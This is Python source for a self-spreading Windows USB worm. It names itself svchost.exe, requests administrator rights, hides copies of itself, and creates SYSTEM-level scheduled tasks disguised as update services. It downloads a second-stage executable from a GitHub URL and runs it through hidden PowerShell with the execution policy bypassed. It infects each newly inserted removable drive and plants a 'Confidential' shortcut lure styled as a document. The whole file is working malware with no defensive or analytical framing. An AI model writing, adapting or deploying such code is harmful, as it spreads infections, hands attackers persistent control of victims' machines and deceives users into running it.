import os
import shutil
import subprocess
import psutil
import time
import ctypes
import requests
import sys
from win32com.client import Dispatch
from win32com.shell import shell

WORM_NAME = "svchost.exe"
PAYLOAD_NAME = "init.exe"
WORM_PATH = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'SystemData', WORM_NAME) 
PAYLOAD_PATH = os.path.join(os.getenv('TEMP'), PAYLOAD_NAME) 
WORM_TASK_NAME = "WindowsUpdateService"  
PAYLOAD_TASK_NAME = "BIOSUpdate"  
SHORTCUT_NAME = "Confidential.lnk"
FLAG_FILE = os.path.join(os.getenv('TEMP'), "1572754491.txt")

def is_admin():
    return ctypes.windll.shell32.IsUserAnAdmin()

def request_admin():
    if not is_admin():
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        ctypes.windll.shell32.ShellExecuteW(None, "runas", exe_path, '', None, 1)
        sys.exit(0)

def is_usb_drive():
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    drive = os.path.splitdrive(os.path.abspath(exe_path))[0]
    drive = drive + '\\'
    for partition in psutil.disk_partitions():
        if partition.device == drive and 'removable' in partition.opts:
            return True
    return False

def download_payload():
    init_url = "https://github.com/Soumyo001/progressive_0verload/raw/refs/heads/main/initializers/init.exe"
    if not os.path.exists(PAYLOAD_PATH):
        try:
            response = requests.get(init_url)
            with open(PAYLOAD_PATH, 'wb') as f:
                f.write(response.content)
                subprocess.run(f"attrib +h +s +r {PAYLOAD_PATH}", shell=True)
        except: pass

def create_scheduled_tasks(self_only = False):
    worm_cmd = f'schtasks /create /tn {WORM_TASK_NAME} /tr "{WORM_PATH}" /sc onlogon /ru SYSTEM /rl HIGHEST /f'
    subprocess.run(worm_cmd, shell=True)
    if not os.path.exists(FLAG_FILE) and not self_only:
        payload_cmd = f'schtasks /create /tn {PAYLOAD_TASK_NAME} /tr "powershell.exe -nop -w hidden -ep bypass -c \\"{PAYLOAD_PATH};schtasks /delete /tn {PAYLOAD_TASK_NAME} /f\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f'
        subprocess.run(payload_cmd, shell=True)
        subprocess.run(f'schtasks /run /tn {PAYLOAD_TASK_NAME}', shell=True)
        with open(FLAG_FILE, 'w') as f:
            f.write("done")

def install_worm():
    if os.path.exists(WORM_PATH): os.remove(WORM_PATH)
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    if not os.path.exists(os.path.dirname(WORM_PATH)):
        os.makedirs(os.path.dirname(WORM_PATH))
    shutil.copy2(exe_path, WORM_PATH)
    subprocess.run(f"attrib +h +s +r {WORM_PATH}", shell=True)

def create_shortcut(drive):
    """Create a shortcut (Confidential.lnk) on USB pointing to the usb worm"""
    try:
        wscript = Dispatch('WScript.Shell')
        shortcut_path = os.path.join(drive, SHORTCUT_NAME)
        target_path = os.path.join(drive, WORM_NAME)
        shortcut = wscript.CreateShortCut(shortcut_path)
        shortcut.TargetPath = target_path
        shortcut.IconLocation = "%SystemRoot%\\system32\\shell32.dll,70"  # PDF icon
        shortcut.Description = "Confidential Document"
        shortcut.save()
    except Exception:
        pass

def infect_usb(drive):
    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    worm_dest = os.path.join(drive, WORM_NAME)
    shutil.copy2(exe_path, worm_dest)
    subprocess.run(f"attrib +h +s +r {worm_dest}", shell=True)  # Hide worm
    create_shortcut(drive)  # Create lure shortcut

def monitor_usb():
    known_drives = set(p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts)
    while True:
        current_drives = set(p.mountpoint for p in psutil.disk_partitions() if 'removable' in p.opts)
        new_drives = current_drives - known_drives
        for drive in new_drives:
            infect_usb(drive)
        known_drives = current_drives
        time.sleep(1)

def main():
    if is_usb_drive():
        request_admin()
        install_worm()
        download_payload()
        create_scheduled_tasks()
    else:
        install_worm()
        create_scheduled_tasks(self_only=True)
        monitor_usb()

if __name__ == "__main__":
    main()